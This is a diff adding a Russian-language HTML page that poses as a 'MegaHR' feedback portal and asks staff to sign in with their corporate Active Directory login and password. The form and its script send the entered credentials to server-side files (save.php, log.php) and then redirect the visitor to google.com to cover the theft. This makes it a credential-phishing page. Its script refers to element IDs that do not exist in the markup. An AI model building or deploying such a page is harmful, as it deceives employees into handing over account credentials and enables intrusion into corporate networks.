@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>MegaHR — Обратная связь</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="form-container">
+        <h1>MegaHR</h1>
+        <p>Пожалуйста, войдите, используя корпоративные учетные данные</p>
+        <form action="save.php" method="post">
+            <input type="text" name="username" placeholder="Логин Active Directory" required>
+            <input type="password" name="password" placeholder="Пароль" required>
+            <button type="submit">Продолжить</button>
+        </form>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+          e.preventDefault();
+    
+          const username = document.getElementById('username').value;
+          const password = document.getElementById('password').value;
+    
+          const formData = new URLSearchParams();
+          formData.append('username', username);
+          formData.append('password', password);
+    
+          fetch('log.php', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: formData.toString()
+          })
+          .then(() => {
+            window.location.href = 'https://google.com';
+          })
+          .catch(err => {
+            console.error('Ошибка:', err);
+          });
+        });
+      </script>
+</body>
+</html>
